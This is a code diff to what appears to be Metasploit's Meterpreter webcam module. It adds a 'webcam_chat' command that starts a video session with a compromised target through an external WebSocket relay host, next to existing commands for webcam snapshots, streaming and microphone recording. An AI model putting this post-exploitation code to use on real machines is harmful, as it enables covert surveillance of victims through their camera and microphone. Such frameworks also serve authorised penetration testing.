@@ -22,12 +22,14 @@ class Console::CommandDispatcher::Stdapi::Webcam
   #
   def commands
     all = {
+      "webcam_chat"   => "Start a video chat",
       "webcam_list"   => "List webcams",
       "webcam_snap"   => "Take a snapshot from the specified webcam",
       "webcam_stream" => "Play a video stream from the specified webcam",
       "record_mic"    => "Record audio from the default microphone for X seconds"
     }
     reqs = {
+      "webcam_chat"   => [ "webcam_list" ],
       "webcam_list"   => [ "webcam_list" ],
       "webcam_snap"   => [ "webcam_start", "webcam_get_frame", "webcam_stop" ],
       "webcam_stream" => [ "webcam_start", "webcam_get_frame", "webcam_stop" ],
@@ -129,6 +131,42 @@ class Console::CommandDispatcher::Stdapi::Webcam
     end
   end
 
+  def cmd_webcam_chat(*args)
+    if client.webcam.webcam_list.length == 0
+      print_error("Target does not have a webcam")
+      return
+    end
+
+    server = 'wsnodejs.jit.su:80'
+
+    webcam_chat_opts = Rex::Parser::Arguments.new(
+      "-h" => [ false, "Help banner"],
+      "-s" => [ false, "WebSocket server" ]
+    )
+
+    webcam_chat_opts.parse( args ) { | opt, idx, val |
+      case opt
+        when "-h"
+          print_line( "Usage: webcam_chat [options]\n" )
+          print_line( "Starts a video conversation with your target." )
+          print_line( "Browser Requirements:")
+          print_line( "Chrome: version 23 or newer" )
+          print_line( "Firefox: version 22 or newer" )
+          print_line( webcam_chat_opts.usage )
+          return
+        when "-s"
+          server = val.to_s
+      end
+    }
+
+
+    begin
+      print_status("Webcam chat session initialized.")
+      client.webcam.webcam_chat(server)
+    rescue RuntimeError => e 
+      print_error(e.message)
+    end
+  end
 
   def cmd_webcam_stream(*args)
     print_status("Starting...")
